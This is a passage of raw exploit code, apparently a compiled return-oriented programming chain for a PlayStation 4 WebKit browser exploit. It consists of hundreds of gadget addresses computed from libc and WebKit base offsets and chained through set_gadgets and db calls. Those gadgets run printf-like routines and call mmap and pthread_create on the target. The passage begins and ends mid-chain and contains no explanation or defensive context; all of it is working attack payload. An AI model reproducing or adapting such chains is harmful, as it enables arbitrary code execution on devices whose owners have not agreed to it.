libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+158944, //L2348
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
pthread_create_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160272, //L2349
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//_printf_:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160344, //L2350
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160408, //L2352
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160504, //L2354
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160520, //L2355
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2354:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2355:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160632, //L2356
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160616, //L2357
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2356:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160704, //L2358
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160808, //L2360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160792, //L2361
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2361:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2360:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+160936, //L2365
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+160920, //L2364
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+161072, //L2368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161056, //L2367
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2366:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2367:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2368:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+161224, //L2370
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161256, //L2372
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+161208, //L2369
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161240, //L2371
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2369:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161328, //L2373
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161344, //L2374
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161464, //L2376
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161480, //L2377
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161448, //L2375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+161648, //L2379
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161664, //L2380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161632, //L2378
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2378:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2379:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2380:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161768, //L2382
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161816, //L2385
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161784, //L2383
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2383:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+161928, //L2386+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+161920, //L2386
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2386:
db([0, 0]); // 0x0
set_gadgets([
ropchain+161944, //L2386+24
ropchain+162768, //L2381
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161984, //L2387
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2387:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2388:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L2389:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162112, //L2391
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162096, //L2390
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+162208, //L2393
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2392:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+162352, //L2396
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162336, //L2395
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2394:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2395:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+162504, //L2398
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+162536, //L2400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+162488, //L2397
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162520, //L2399
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162632, //L2402
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162616, //L2401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2402:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2404:
ropchain+162736, //L2403
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+165152, //L2405
//L2403:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2381:
libc_base+793877, //pop rsi
ropchain+162824, //L2408
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2407:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+162912, //L2409
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162928, //L2411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2409:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+163088, //L2415
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+163040, //L2412
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163056, //L2413
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2412:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2413:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2414:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163144, //L2417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163248, //L2418
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163280, //L2420
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163264, //L2419
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2418:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2420:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163440, //L2424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163392, //L2421
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163408, //L2422
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2421:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2423:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163496, //L2426
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2426:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163600, //L2427
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163632, //L2429
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163616, //L2428
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2427:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2428:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2429:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163704, //L2430
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163720, //L2431
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163880, //L2435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163832, //L2432
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163848, //L2433
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2432:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2433:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2434:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2435:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163936, //L2437
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2437:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+164040, //L2438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164072, //L2440
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+164056, //L2439
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2438:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
